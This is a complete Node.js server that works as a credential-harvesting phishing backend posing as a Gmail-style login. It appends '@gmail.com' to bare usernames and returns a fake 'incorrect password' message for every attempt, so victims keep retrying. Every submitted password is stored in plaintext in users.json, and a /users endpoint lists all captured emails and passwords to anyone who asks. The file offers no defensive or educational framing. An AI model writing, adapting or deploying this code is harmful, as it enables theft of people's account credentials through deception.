const http = require('http');
const fs = require('fs/promises');
const path = require('path');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'users.json');
const INDEX_FILE = path.join(__dirname, 'index.html');
const GENERIC_MESSAGE = 'Incorect username or password.';

async function ensureDataFile() {
  try {
    await fs.access(DATA_FILE);
  } catch {
    await fs.writeFile(DATA_FILE, '[]', 'utf8');
  }
}

async function readUsers() {
  await ensureDataFile();

  try {
    const raw = await fs.readFile(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (error) {
    console.error('Error reading users.json:', error);
    return [];
  }
}

async function writeUsers(users) {
  await fs.writeFile(DATA_FILE, JSON.stringify(users, null, 2), 'utf8');
}

function createUserId() {
  return `user_${Date.now()}_${Math.floor(Math.random() * 1000000)}`;
}

function normalizeUser(user) {
  return {
    id: user.id || createUserId(),
    email: typeof user.email === 'string' ? user.email : '',
    password: Array.isArray(user.password) ? user.password : [],
  };
}

function normalizeEmailInput(value) {
  if (typeof value !== 'string') {
    return null;
  }

  const trimmed = value.trim().toLowerCase();

  if (!trimmed) {
    return null;
  }

  if (!trimmed.includes('@')) {
    return `${trimmed}@gmail.com`;
  }

  if (!trimmed.endsWith('@gmail.com')) {
    return null;
  }

  return trimmed;
}

async function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }

      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(error);
      }
    });

    req.on('error', reject);
  });
}

function sendJson(res, statusCode, payload) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
  });
  res.end(JSON.stringify(payload));
}

async function serveIndex(res) {
  try {
    const html = await fs.readFile(INDEX_FILE);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
  } catch (error) {
    console.error('Error serving index.html:', error);
    sendJson(res, 500, { message: 'Server error.' });
  }
}

async function handleLogin(req, res) {
  try {
    const body = await parseJsonBody(req);
    const email = normalizeEmailInput(body.email);
    const password = typeof body.password === 'string' ? body.password : '';

    if (!email || !password) {
      sendJson(res, 200, { message: GENERIC_MESSAGE });
      return;
    }

    const users = (await readUsers()).map(normalizeUser);
    const existingUser = users.find((user) => user.email === email);

    if (existingUser) {
      if (!existingUser.password.includes(password)) {
        existingUser.password.push(password);
        await writeUsers(users);
      }
    } else {
      users.push({
        id: createUserId(),
        email,
        password: [password],
      });
      await writeUsers(users);
    }

    sendJson(res, 200, { message: GENERIC_MESSAGE });
  } catch (error) {
    console.error('Error handling login:', error);
    sendJson(res, 200, { message: GENERIC_MESSAGE });
  }
}

async function handleUsers(res) {
  try {
    const users = (await readUsers()).map(normalizeUser);
    const usersSafeData = users.map((user) => ({ email: user.email, passwords: user.password }));
    sendJson(res, 200, usersSafeData);
  } catch (error) {
    console.error('Error fetching users:', error);
    sendJson(res, 500, { message: 'Server error fetching users.' });
  }
}

const server = http.createServer(async (req, res) => {
  const requestUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = requestUrl.pathname;

  if (req.method === 'GET' && pathname === '/') {
    await serveIndex(res);
    return;
  }

  if (req.method === 'POST' && pathname === '/') {
    await handleLogin(req, res);
    return;
  }

  if (req.method === 'GET' && pathname === '/users') {
    await handleUsers(res);
    return;
  }

  sendJson(res, 404, { message: 'Not found.' });
});

server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
